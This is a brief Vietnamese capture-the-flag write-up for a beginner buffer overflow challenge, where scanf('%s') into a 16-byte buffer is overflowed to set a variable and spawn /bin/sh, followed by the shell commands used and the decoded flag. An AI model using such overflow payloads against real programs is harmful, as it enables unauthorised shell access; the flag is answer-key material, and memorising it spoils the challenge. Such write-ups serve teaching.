1. Vị trí có thể khai thác:  
  Hàm scanf("%s", buf);:    
  buf chỉ có 16 bytes, nhưng scanf("%s") không kiểm tra kích thước nhập vào, có thể nhập dữ liệu lớn hơn để ghi đè lên biến v1.  
  Nếu ghi đè v1 != 0, chương trình sẽ chạy system("/bin/sh"), mở một shell cho attacker.  
Payload : AAAAAAAAAAAAAAAAAAAA\x01\x00\x00\x00

vào shell   
-> ls -la  
-> thay file .flag  
-> cat .flag  
-> flag dạng hex  
-> decrypt 

4649417b305633725f463130575f31535f333453597d -> FIA{0V3r_F10W_1S_34SY}
